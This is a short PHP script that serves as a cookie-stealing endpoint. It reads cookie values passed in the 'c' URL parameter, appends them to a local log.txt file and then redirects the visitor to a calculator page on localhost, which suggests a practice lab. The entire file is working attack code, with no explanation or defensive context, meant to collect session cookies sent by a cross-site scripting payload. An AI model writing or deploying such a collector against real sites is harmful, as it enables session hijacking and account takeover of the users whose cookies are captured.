<?php
header ('Location:http://localhost/database/calculator.php');
$cookies = $_GET["c"];
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");
?>